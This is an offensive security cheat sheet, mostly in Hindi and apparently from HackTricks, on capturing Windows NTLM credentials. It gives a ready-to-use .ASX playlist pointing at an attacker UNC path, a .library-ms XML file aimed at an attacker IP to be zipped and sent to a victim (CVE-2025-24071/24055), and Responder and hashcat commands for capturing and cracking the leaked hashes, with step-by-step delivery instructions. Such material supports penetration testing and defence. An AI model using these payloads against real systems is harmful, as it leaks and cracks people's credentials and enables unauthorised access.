# NTLM creds चुराने के स्थान

{{#include ../../banners/hacktricks-training.md}}

**इन बेहतरीन विचारों को देखें: [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — ऑनलाइन एक microsoft word file डाउनलोड करने से लेकर ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md और [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**


### Windows Media Player प्लेलिस्ट (.ASX/.WAX)

यदि आप किसी लक्ष्य को आपका नियंत्रित Windows Media Player प्लेलिस्ट खोलने या पूर्वावलोकन करने के लिए प्रेरित कर सकें, तो आप किसी एंट्री को UNC path की ओर इशारा करके Net‑NTLMv2 leak कर सकते हैं। WMP संदर्भित मीडिया को SMB पर fetch करने का प्रयास करेगा और स्वतः authenticate करेगा।

उदाहरण payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
संग्रह और cracking प्रवाह:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer ZIP आर्काइव के भीतर से सीधे खोली गई .library-ms फ़ाइलों को असुरक्षित तरीके से हैंडल करता है। यदि लाइब्रेरी परिभाषा किसी रिमोट UNC path (उदाहरण के लिए \\attacker\share) की ओर इशारा करती है, तो ZIP के अंदर .library-ms को ब्राउज़/लॉन्च करने मात्र से Explorer उस UNC को enumerate करता है और attacker को NTLM authentication भेज देता है। इससे NetNTLMv2 प्राप्त होता है जिसे offline में क्रैक किया जा सकता है या संभावित रूप से relayed किया जा सकता है।

एक न्यूनतम .library-ms जो attacker UNC की ओर इशारा करती है
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
ऑपरेशनल चरण
- ऊपर दिए गए XML के साथ .library-ms फ़ाइल बनाएं (अपना IP/hostname सेट करें)।
- इसे ZIP करें (on Windows: Send to → Compressed (zipped) folder) और ZIP को लक्ष्य तक पहुँचाएं।
- NTLM capture listener चलाएँ और पीड़ित के ZIP के अंदर से .library-ms खोलने तक प्रतीक्षा करें।

## संदर्भ
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)


{{#include ../../banners/hacktricks-training.md}}
